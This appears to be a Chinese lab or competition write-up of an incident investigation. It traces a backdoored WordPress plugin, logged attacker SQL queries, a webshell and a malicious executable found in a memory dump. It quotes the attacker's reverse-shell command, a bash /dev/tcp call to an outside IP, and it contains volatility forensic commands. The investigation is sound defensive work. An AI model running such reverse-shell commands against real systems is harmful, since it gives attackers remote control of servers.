# 事件响应
## Web Server
### 任务
- 查找并提交存在后门插件的名称与版本号，并指出该后门的功能
- 分析并指出攻击者如何获取到应用管理员权限
- 提交上述攻击所使用的URL以及获取到管理员信息时执行的完整语句（含注释）
- 请阐述攻击者如何在获得管理员权限后，写入Webshell以提升其权限
- 查找攻击者获得写入的Webshell文件绝对路径
- 查看并提交攻击者写入的Webshell内容
- 分析反弹Shell时使用的恶意IP地址和端口
- 分析攻击者在服务器上开启的端口号及其目的
### 调查过程
在webserver中查看历史命令，计划任务，后门用户和端口，进程
存在其他的端口8024
![](attachment/Pasted%20image%2020230220121713.png)
在Web Server查看本机IP后利用同网段主机访问对应的web服务，发现为WordPress的网站，于是在本机去访问插件对应的目录进行调查
`/var/www/html/wp-content/plugins`
发现在 ==hello.php== 中存在后门代码，功能是能够进行sql查询，但是语句经过rot13和base64的加密
![](attachment/Pasted%20image%2020230219141212.png)

版本在文件开头的注释中
![](attachment/Pasted%20image%2020230219141339.png)

在/var/log/apache2 中发现有日志记录，参数名与插件后门一致
![](attachment/Pasted%20image%2020230219145338.png)
在foot-dark.php中又有命令执行相关日志
![](attachment/Pasted%20image%2020230219150410.png)

查看后发现这个页面可以进行命令执行
![](attachment/Pasted%20image%2020230219150548.png)

关于日志中的加密语句，利用php来进行解密会更加合适和快捷
```php
<?php
$file = 'log.txt';
$file_data = file_get_contents($file);
$data_array = explode("\n", $file_data);
foreach($data_array as $sql_str) {
	echo $sql_str;
	$trans = base64_decode(str_rot13(urldecode($sql_str)));
	echo $trans;
	file_put_content('out.txt',$trans.PHP_EOL, FILE_APPEND);
}
?>
```
细看解密后的log后会发现有一行看了user表，执行后效果是这样
![](attachment/Pasted%20image%2020230220121458.png)
获得用户名与密码
同样对日志中的webshell相关的日志url解码分析
![](attachment/Pasted%20image%2020230220140730.png)
反弹shell
`bash -c "bash i >& /dev/tcp/0x1d205d4/12450 0>&1"`
IP:1.210.5.212
## Cache server
### 工作任务

### 调查过程

# 数字调查取证
## Dump.raw
### 工作任务
- 识别内存中的恶意进程
- 查找并提交恶意程序在硬盘中上的完整路径
- 分析PE文件以描述其行为
- 分析PE文件寻找攻击者向外传递收集到的信息发送方的地址
### 调查过程
查看镜像类型
![](attachments/Pasted%20image%2020230227090948.png)
查看进程并输入到文本
volatility -f  \[filename\] --profile=\[imageinfo\]  pslist > pslist.txt
![](attachments/Pasted%20image%2020230227091850.png)
volatility -f  \[filename\] --profile=\[imageinfo\]  pstree > pstree.txt
![](attachments/Pasted%20image%2020230227091918.png)
导出对应进程文件
volatility -f \[filename\] --profile=\[imageinfo\] memdump -p \[PID\] -D ./

volatility -f\[filename\] --profile=\[imageinfo\]  filescan
![](attachments/Pasted%20image%2020230227092450.png)
文件路径： `\Device\HarddiskVolume1\User\IEUser\Downloads\SteamInstaller.exe`
在这个dmp文件里面找敏感内容
![](attachments/Pasted%20image%2020230227093739.png)

将exe文件导出
volatility -f \[filename\] --profile=\[imageinfo\] dumpfiles -Q \[偏移地址\] --dump-dir ./
IDA进行逆向
![](attachments/Pasted%20image%2020230227104206.png)